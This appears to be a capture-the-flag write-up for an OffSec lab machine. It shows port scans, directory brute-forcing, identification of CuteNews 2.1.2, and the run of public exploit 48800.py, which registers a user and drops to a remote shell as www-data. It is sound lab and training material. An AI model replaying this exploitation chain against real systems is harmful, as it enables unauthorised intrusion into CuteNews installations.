```
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.222.128 -- -Pn
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.222.128:22
Open 192.168.222.128:80
Open 192.168.222.128:88
Open 192.168.222.128:110
Open 192.168.222.128:995
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 03:54 EDT
Initiating Parallel DNS resolution of 1 host. at 03:54
Completed Parallel DNS resolution of 1 host. at 03:54, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 03:54
Scanning 192.168.222.128 [5 ports]
Discovered open port 110/tcp on 192.168.222.128
Discovered open port 80/tcp on 192.168.222.128
Discovered open port 22/tcp on 192.168.222.128
Discovered open port 995/tcp on 192.168.222.128
Discovered open port 88/tcp on 192.168.222.128
Completed Connect Scan at 03:54, 0.16s elapsed (5 total ports)
Nmap scan report for 192.168.222.128
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-31 03:54:34 EDT for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
88/tcp  open  kerberos-sec syn-ack
110/tcp open  pop3         syn-ack
995/tcp open  pop3s        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

```
> rustscan -u 5000 -p 22,80,88,110,995 -a 192.168.222.128 -- -Pn -sCV
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.222.128:22
Open 192.168.222.128:80
Open 192.168.222.128:110
Open 192.168.222.128:88
Open 192.168.222.128:995
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 03:56 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:57
Completed Parallel DNS resolution of 1 host. at 03:57, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 03:57
Scanning 192.168.222.128 [5 ports]
Discovered open port 80/tcp on 192.168.222.128
Discovered open port 22/tcp on 192.168.222.128
Discovered open port 995/tcp on 192.168.222.128
Discovered open port 110/tcp on 192.168.222.128
Discovered open port 88/tcp on 192.168.222.128
Completed Connect Scan at 03:57, 0.16s elapsed (5 total ports)
Initiating Service scan at 03:57
Scanning 5 services on 192.168.222.128
Completed Service scan at 03:57, 7.01s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.222.128.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 10.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 1.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
Nmap scan report for 192.168.222.128
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-31 03:57:00 EDT for 19s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfExBygmjGp3e7nXpwC4vVz4LWCyYHz0L7j/LG/9jppdNt9Mu+zgnzKeiXSl7MUUNHxX2diHm7cdwzjRZATsPHs/x8QXhkwLpcJNvKAKl4dg+HFJIJaQH1yyzdY93yoiRrjqG37VJ4FCh68d8ouC4UGtsf9jjzxA3LwPpn7q8Tw/uqN/8+CMdmTyqa07Z2mVdmkzyokknCX40ZCBCUNPgQYTQYLW3GAmJMuHcE5d7SSyogWeqPbkM7Mub3x5rwYL1Wf+9Y8I5SbmMcFRHOSGroKHYcvbvt8A/VUqw44XtzvPdllhfFbwWpj1xwcNILi1WgWoBw3ymD14PFZUWXUZbR
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBiSQebU59RFA2H+6WZcwxmwTS9j3i3ttgEcwQi8oJoo7UNtulXExHcLQt2AXsZuRk6WilnLEoKyZxwC5DWsikE=
|   256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF6g+3N64VFhd+Aw/pbyZ7+qU1m+PoxIE9Rmeo61lXIe
80/tcp  open  http     syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     syn-ack nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 404 Not Found
110/tcp open  pop3     syn-ack Courier pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP UTF8(USER) PIPELINING STLS LOGIN-DELAY(10) USER IMPLEMENTATION(Courier Mail Server) UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
| SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
995/tcp open  ssl/pop3 syn-ack Courier pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP UTF8(USER) PIPELINING LOGIN-DELAY(10) USER IMPLEMENTATION(Courier Mail Server) UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
| SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:57
Completed NSE at 03:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds
```

TCP 80/HTTP
```
http://192.168.222.128
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/00063a7f-3a66-46dc-a1de-44be1b8c6158)

Content Discovery
```
> feroxbuster -u http://192.168.222.128  -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-recursion --dont-extract-links --random-agent --filter-status 404 --redirects
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.222.128
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      368l      933w    10701c http://192.168.222.128/
200      GET        0l        0w        0c http://192.168.222.128/core/
200      GET        0l        0w        0c http://192.168.222.128/docs/
200      GET        1l       12w     1311c http://192.168.222.128/favicon.ico
200      GET      368l      933w    10701c http://192.168.222.128/index.html
200      GET      168l      396w     6174c http://192.168.222.128/index.php
200      GET        0l        0w        0c http://192.168.222.128/libs/
200      GET       13l       26w      626c http://192.168.222.128/manual/
200      GET        0l        0w        0c http://192.168.222.128/skins/
200      GET        0l        0w        0c http://192.168.222.128/uploads/
[####################] - 17s     4724/4724    0s      found:10      errors:0      
[####################] - 17s     4724/4724    273/s   http://192.168.222.128/  
```

```
http://192.168.222.128/index.php
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/fd3a972a-3797-4fea-a4eb-ae39505de7d3)

Cute News 2.1.2 (news management system)
```
> searchsploit cutenews 2.1.2
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/35532951-adc7-4fa6-b051-6d157b8960ed)

Modify the exploit since "Cute News" is installed in the root dorectory.

```
> python3 48800.py



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://192.168.222.128
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: LBEZG5YYUM and password: LBEZG5YYUM

=======================================================
Sending Payload
=======================================================
signature_key: e4d899689070c7c71984787291674266-LBEZG5YYUM
signature_dsi: 7114303731d4cd8904c1c34b4d0c1567
logged in user: LBEZG5YYUM
============================
Dropping to a SHELL
============================

command > whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
